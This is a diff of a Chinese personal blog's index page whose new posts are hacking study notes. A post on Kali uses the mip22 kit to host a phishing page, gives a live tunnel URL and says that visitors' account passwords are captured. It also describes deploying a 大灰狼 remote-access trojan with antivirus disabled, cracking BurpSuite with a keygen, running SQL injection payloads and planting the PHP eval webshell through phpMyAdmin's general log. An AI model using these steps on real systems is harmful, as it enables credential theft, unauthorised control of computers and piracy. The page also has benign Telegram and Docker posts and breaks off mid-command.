@@ -43,7 +43,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -71,12 +71,12 @@
 
         <section id="main">
   
-    <article id="post-我的博客" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-kali中设置钓鱼网站" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/11/08/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time class="post-time" datetime="2023-11-08T08:56:17.000Z" itemprop="datePublished">
+    <a href="/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/" class="article-date">
+  <time class="post-time" datetime="2023-11-28T03:15:53.000Z" itemprop="datePublished">
     <span class="post-month">11月</span><br/>
-    <span class="post-day">08</span>
+    <span class="post-day">28</span>
   </time>
 </a>
    
@@ -88,7 +88,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/08/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">我的博客</a>
+      <a class="article-title" href="/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">kali中设置钓鱼网站</a>
     </h1>
   
 
@@ -103,65 +103,65 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h2><p>1.提前安装好<a target="_blank" rel="noopener" href="https://nodejs.org/en]">node.js</a>左边的那个<br>2.提前安装好<a target="_blank" rel="noopener" href="https://git-scm.com/downloads">GIt</a><br>3.提前注册好一个<a target="_blank" rel="noopener" href="https://github.com/">github</a>账号</p>
-<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>1.在本地找个目录放博客源文件，路径不要有中文</p>
-<p>2.在选定的目录中，右键Git Bash Here</p>
-<p>3.使用npm命令安装Hexo，输入：</p>
-<blockquote>
-<p>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g</p>
-</blockquote>
-<p>构建好的效果如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img1697534665972-adf4dbdc-43e3-4cb7-89c3-5751f01b4b59.png" alt="img"></p>
-<p>4.检查网站雏形</p>
-<blockquote>
-<p>hexo new x<br>新建一个名为x的网页模块<br>hexo g<br>hexo s<br>完成后可以通过本机IP地址：4000预览页面</p>
-</blockquote>
-<p>5.配置ssh</p>
-<blockquote>
-<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥</p>
-</blockquote>
-<p>如果提示：No such file or directory 说明你是第一次使用git。</p>
-<blockquote>
-<p>ssh-keygen -t rsa -C “邮件地址”</p>
-</blockquote>
-<p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p>
-<ul>
-<li><p>key填写C:\Users\当前用户名.ssh\id_rsa.pub中的内容</p>
-</li>
-<li><p>尝试ssh连接,测试是否成功</p>
-</li>
+        <h2 id="kali中设置钓鱼网站"><a href="#kali中设置钓鱼网站" class="headerlink" title="kali中设置钓鱼网站"></a>kali中设置钓鱼网站</h2><ul>
+<li>下载文件</li>
 </ul>
-<p>ssh -T <a href="mailto:git@github.com">git@github.com</a> # 注意邮箱地址不用改</p>
-<ul>
-<li><p>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</p>
-</li>
-<li><p>在选中的位置(blog目录下)打开cmd(以管理员身份)</p>
-</li>
+<p>输入sudo su进入管理员模式</p>
+<p>vim  &#x2F;etc&#x2F;proxychains4.conf</p>
+<p>进入proxychains4.conf将地址改为主机地址和主机clash的端口号。点i进入插入模式。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128154710552.png" alt="image-20231128154710552"></p>
+<p>点esc退出插入模式，输入：wq！（强制保存退出）</p>
+<p>proxychains4 git clone <a target="_blank" rel="noopener" href="https://github.com/makdosx/mip22%EF%BC%88%E4%B8%8B%E8%BD%BDgithub%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%89">https://github.com/makdosx/mip22（下载github中的文件）</a></p>
+<p>ls（查看是否有mip22文件夹）</p>
+<p>cd mip22(转到mip22文件夹)</p>
+<p>chomod +x .&#x2F;*(加x权限)</p>
+<p>proxychains4 bash .&#x2F;mip22.sh(设置钓鱼网站)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128160601296.png" alt="image-20231128160601296"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128161045346.png" alt="image-20231128161045346"></p>
+<p>接下来输入</p>
+<p>1</p>
+<p>19（选择需要的网站）</p>
+<p>3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128161324649.png" alt="image-20231128161324649"></p>
+<p>看到网子就成功了。</p>
+<p>在网站中打开网址<a target="_blank" rel="noopener" href="http://asking-wars-mozambique-vincent.trycloudflare.com/">http://asking-wars-mozambique-vincent.trycloudflare.com</a></p>
+<p>这时候别人点击网站输入账号密码就可以获取。</p>
+<h2 id="Visual-Studio-Code"><a href="#Visual-Studio-Code" class="headerlink" title="Visual-Studio-Code"></a>Visual-Studio-Code</h2><ul>
+<li>安装与下载</li>
 </ul>
-<p>npm install hexo-deployer-git –save</p>
+<p>官方网站：<a target="_blank" rel="noopener" href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
 <ul>
-<li>在上一个<em>Git Bash Here</em>还需要继续配置</li>
+<li>配置</li>
 </ul>
-<p>git config –global user.name “xxx”&#x2F;&#x2F; 你的github用户名，非昵称<br>git config –global user.email “<a href="mailto:xxx@qq.com">xxx@qq.com</a>“&#x2F;&#x2F; 填写你的github注册邮箱</p>
-<p> 6.准备上传代码 </p>
-<ul>
-<li><p>在github上新建一个存储库，命名为github的用户名.github.io（必须与自己github注册用户名一致，因为Github 仅能使用一个同名仓库的代码托管一个静态站点）</p>
-</li>
-<li><p>编辑_config.yml文件，在最后改成这样</p>
-<blockquote>
-<p>deploy:<br>    type: git<br>    repository: <a href="mailto:&#103;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#46;&#x63;&#111;&#109;</a>:xxx&#x2F;xxx.github.io.git<br>    branch: main</p>
-</blockquote>
-</li>
-<li><p>注意保持格式，缩进不对，会导致一会儿，上传不成功</p>
-</li>
-<li><p>最后上传</p>
-</li>
-</ul>
+<p>点击扩展</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128172755036.png" alt="image-20231128172755036"></p>
+<p>下载Chinese（简体），Code Runner,Pylance,再重启vs即可使用。</p>
+<p>输入代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests;</span><br><span class="line">url = &quot;https://httpbin.org/get&quot;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
+
+<p>点击右上角运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128190504339.png" alt="image-20231128190504339"></p>
+<p>会报错，再同时点击ctrl和~打开终端。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128190648462.png" alt="image-20231128190648462"></p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install (chardet) -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br><span class="line">括号中写入要安装的</span><br></pre></td></tr></table></figure>
+
+<p>安装完后再运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128191027136.png" alt="image-20231128191027136"></p>
+<h2 id="远程控制（大灰狼远控）"><a href="#远程控制（大灰狼远控）" class="headerlink" title="远程控制（大灰狼远控）"></a>远程控制（大灰狼远控）</h2><p>要关闭防火墙和实时保护。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128191835337.png" alt="image-20231128191835337"></p>
+<p>下载windows病毒监听&#x2F;DHLv9.5.zip并打开。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128192616861.png" alt="image-20231128192616861"></p>
+<p>再点击服务生成，域名ip改成本机ip，再点击生成服务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128192852101.png" alt="image-20231128192852101"></p>
+<p>再将生成的Server.exe放在要控制的电脑上。</p>
+<p>这时软件上会多一个控制电脑的信息，就可以对这台电脑进行控制了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231128193204132.png" alt="image-20231128193204132"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/08/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" data-id="clplzuha4000hq8u4fcdyh5ge" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/" data-id="clplzuh9z0008q8u493f91lo4" class="article-share-link">分享</a>
       
       
     </footer>
@@ -173,57 +173,12 @@
 
 
   
-    <article id="post-虚拟机IPv4地址 ：192.168.0.41" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-注册tg号" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/11/08/%E8%99%9A%E6%8B%9F%E6%9C%BAIPv4%E5%9C%B0%E5%9D%80%20%EF%BC%9A192.168.0.41/" class="article-date">
-  <time class="post-time" datetime="2023-11-08T08:16:57.547Z" itemprop="datePublished">
+    <a href="/2023/11/27/%E6%B3%A8%E5%86%8Ctg%E5%8F%B7/" class="article-date">
+  <time class="post-time" datetime="2023-11-27T11:56:43.000Z" itemprop="datePublished">
     <span class="post-month">11月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>虚拟机IPv4地址 ：192.168.0.41</p>
-<p>子网掩码：255.255.255.0</p>
-<p>默认网关：192.168.0.1</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231108154538885.png" alt="image-20231108154538885"></p>
-<p>私有地址范围：</p>
-<p>10.0.0.0</p>
-<p>172.16.0.0 - 172.31.255.255</p>
-<p>192.168.0.0 - 192.168.255.255</p>
-<p>树型拓扑结构</p>
-<p>三层结构模型:</p>
-<p>接入层：无线网络发射器，AP</p>
-<p>汇聚层：楼层交换机</p>
-<p>核心层</p>
-<p>三种网卡</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/08/%E8%99%9A%E6%8B%9F%E6%9C%BAIPv4%E5%9C%B0%E5%9D%80%20%EF%BC%9A192.168.0.41/" data-id="clplzuha6000mq8u4aq4bbrtg" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-hello-world" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/11/07/hello-world/" class="article-date">
-  <time class="post-time" datetime="2023-11-07T08:10:17.369Z" itemprop="datePublished">
-    <span class="post-month">11月</span><br/>
-    <span class="post-day">07</span>
+    <span class="post-day">27</span>
   </time>
 </a>
    
@@ -235,7 +190,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/07/hello-world/">Hello World</a>
+      <a class="article-title" href="/2023/11/27/%E6%B3%A8%E5%86%8Ctg%E5%8F%B7/">注册tg号</a>
     </h1>
   
 
@@ -250,24 +205,930 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="注册tg号"><a href="#注册tg号" class="headerlink" title="注册tg号"></a>注册tg号</h1><p>华为手机可能接收不到验证码。</p>
+<p>Telegram提供手机版（Android、iOS、Windows Phone）、桌面版（Windows、macOS、Linux）和网页版等多个平台客户端。这里需要提醒，Telegram的官网是<a target="_blank" rel="noopener" href="https://telegram.org/">telegram.org</a>，不是.com。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打开Telegram应用程序并输入手机号码</span><br><span class="line">2.在接收到短信验证码后，输入验证码并设置密码。</span><br><span class="line">3.编辑个人资料、添加联系人、加入频道和群组、发送消息等等。</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>理论上来说，可以使用国内的+86电话号码注册，不过不建议。一是保护隐私，二是Telegram官方已将+86手机号用户拉入黑名单, 新注册用户会被直接定义为spam用户，无法进行私聊和加密对话。可以去获得一个国外号码进行注册。</p>
+<p>Telegram 默认情况下不会加密对话, 如果需要加密对话，需要手动开启。设置方法如下，点击联系人，然后点击对话框右上角三个点，然后选择“Start Secret Chat”。</p>
+<ul>
+<li>tg汉化</li>
+</ul>
+<p>tg:&#x2F;&#x2F;setlanguage?lang&#x3D;zhcncc</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/07/hello-world/" data-id="clplzuh9x0004q8u4caxmfjz8" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/11/27/%E6%B3%A8%E5%86%8Ctg%E5%8F%B7/" data-id="clplzuha6000lq8u40xgsd3xz" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-下载BurpSuite与SQL注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/23/%E4%B8%8B%E8%BD%BDBurpSuite%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="post-time" datetime="2023-11-23T03:25:09.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/23/%E4%B8%8B%E8%BD%BDBurpSuite%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/">下载BurpSuite与SQL注入</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="下载BurpSuite及使用"><a href="#下载BurpSuite及使用" class="headerlink" title="下载BurpSuite及使用"></a>下载BurpSuite及使用</h2><p>下载好BurpSuite v2.1中文版.zip，并进行解压，把解压的文件后缀中文去掉。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123113028158.png" alt="image-20231123113028158"></p>
+<p>双击jdk8进行安装（需要在java8环境中），再点击文件Start.vbs进入，会显示需要激活码。</p>
+<p>在当前文件夹中进入命令行模式（在文件上方输入cmd）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123192903041.png" alt="image-20231123192903041"></p>
+<p>输入java -jar burp-loader-keygen-2.jar回车</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123193424800.png" alt="image-20231123193424800"></p>
+<p>生成的license粘贴进burp的框框</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img1660281372776-3da8d69d-6132-4811-a32f-27b2996bfe5a.png" alt="image.png"></p>
+<p>然后next，选择manual activation。将request复制到 burp-keygen-scz 的 Activation Request。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img1660281564516-76012302-ef85-4fbd-b26c-0cc7329bfc8c.png" alt="image.png"></p>
+<p>把自动生成的 Activation Response 复制回 BurpSuite</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img1660281603398-e82ff9a3-b19a-4d00-aeae-05fcd7e66f9c.png" alt="image.png"></p>
+<p>然后next就可以了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123195424210.png" alt="image-20231123195424210"></p>
+<p>选一个浏览器，打开扩展程序添加代理（如google添加<a href="chrome-extension://padekgcemlokbadohgkifijomclgjgif/options.html#!/about">SwitchyOmega</a>）。</p>
+<p>并进入修改，如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123195828915.png" alt="image-20231123195828915"></p>
+<p>点击应用选项即可保存，并开启代理。</p>
+<p>在进入Burp点击代理，点击拦截代理。现在浏览器打不开网页，且网页可被Burp获取。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123200058746.png" alt="image-20231123200058746"></p>
+<p>在文本中右键点击发送给Repeater。即可在重发器中单独进行网页控制。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123200447709.png" alt="image-20231123200447709"></p>
+<p>进入重发器点击发送，再在右侧点击Click to render page。可查看截取页面。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123210205229.png" alt="image-20231123210205229"></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>进入WWW根目录（phpstudy的根目录）</p>
+<p>下载压缩包pikachu-master.zip，解压缩到WWW目录下。并改名为pikachu。</p>
+<p>启动phpstudy的mysql和apache。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123194702369.png" alt="image-20231123194702369"></p>
+<p>打开网页192.168.110.132&#x2F;pikachu回车，即可进入pikachu网页。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123195215116.png" alt="image-20231123195215116"></p>
+<p>点击SQL-lnject，数字型注入（post）</p>
+<p>选一个数字进行查询。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123203052052.png" alt="image-20231123203052052"></p>
+<p>用Burp进行拦截。并发送给重发器。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123203237540.png" alt="image-20231123203237540"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1  万能密码</span><br><span class="line">1 and 1=1  查看页面是否正常查询</span><br><span class="line">1 and 1=2  页面是否有变化带入数据库进行查询，如果有变化一般存在漏洞</span><br></pre></td></tr></table></figure>
+
+<p>用这些进行判断是否能进行aql注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123205956256.png" alt="image-20231123205956256"></p>
+<p>然后课依次输入下列语句查看数据库内容。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123205040169.png" alt="image-20231123205040169"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123203501165.png" alt="image-20231123203501165"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123205034527.png" alt="image-20231123205034527"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231123205050727.png" alt="image-20231123205050727"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/23/%E4%B8%8B%E8%BD%BDBurpSuite%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/" data-id="clqhz8pnm00027ku44ii58u7j" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-phpMyAdmin" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/22/phpMyAdmin/" class="article-date">
+  <time class="post-time" datetime="2023-11-22T09:00:44.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/22/phpMyAdmin/">phpMyAdmin</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="phpMyAdmin使用"><a href="#phpMyAdmin使用" class="headerlink" title="phpMyAdmin使用"></a>phpMyAdmin使用</h2><p>在浏览器的地址栏中输入：localhost&#x2F;phpMyAdmin&#x2F;，回车，就可以进入phpMyAdmin主界面了。</p>
+<p>show variables like ‘%general%’(查看是否开启全局日志记录)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100304037.png" alt="image-20231122100304037"></p>
+<p>设置开启全局日志记录 set global general_log&#x3D;ON</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100613103.png" alt="image-20231122100613103"></p>
+<p>set global general_log_file&#x3D;’C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;12.php’     将全局日志保存到12.php</p>
+<p>SELECT’<em><?phpinfo(); ?></em>‘     select查询 phpinfo返回php所有信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122152717224.png" alt="image-20231122152717224"></p>
+<p>在网页192.168.110.132&#x2F;12.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122150530446.png" alt="image-20231122150530446"></p>
+<p>SELECT<?php @eval($_POST[cmd]);?>添加一句话木马</p>
+<p>打开蚁剑，右键点击添加数据。</p>
+<p>输入<a target="_blank" rel="noopener" href="http://192.168.110.131/12.php">http://192.168.110.131/12.php</a></p>
+<p>链接码：cdm</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171038082.png" alt="image-20231122171038082"></p>
+<p>保存，双击刚创建的地址。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171159226.png" alt="image-20231122171159226"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/22/phpMyAdmin/" data-id="clplzuha00009q8u403xv7dxc" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-在centos中使用docker" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" class="article-date">
+  <time class="post-time" datetime="2023-11-21T08:08:26.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">21</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/">在centos7中下载及使用docker</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="下载docker并使用镜像和容器"><a href="#下载docker并使用镜像和容器" class="headerlink" title="下载docker并使用镜像和容器"></a>下载docker并使用镜像和容器</h2><p>（可以进入win10管理员模式远程连接centos7并进入其管理员模式：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yun update  (更新系统)</span><br><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo(添加yum)</span><br><span class="line">sudo yum install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>可以使用docker -v 查看docker是否下载</p>
+<p>在&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json(进入)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在里面添加</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br><span class="line">再 ctrl 加 ： 打开输入模式输入wq！（强制退出并保存）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121192119422.png" alt="image-20231121192119422"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">systemctl status docker(打开docker)</span><br><span class="line">docker pull mysql:5.7(下载mysql57)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193103854.png" alt="image-20231121193103854"></p>
+<ul>
+<li><strong>更新docker版本</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">删除原本的docker</span><br><span class="line">yum erase docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  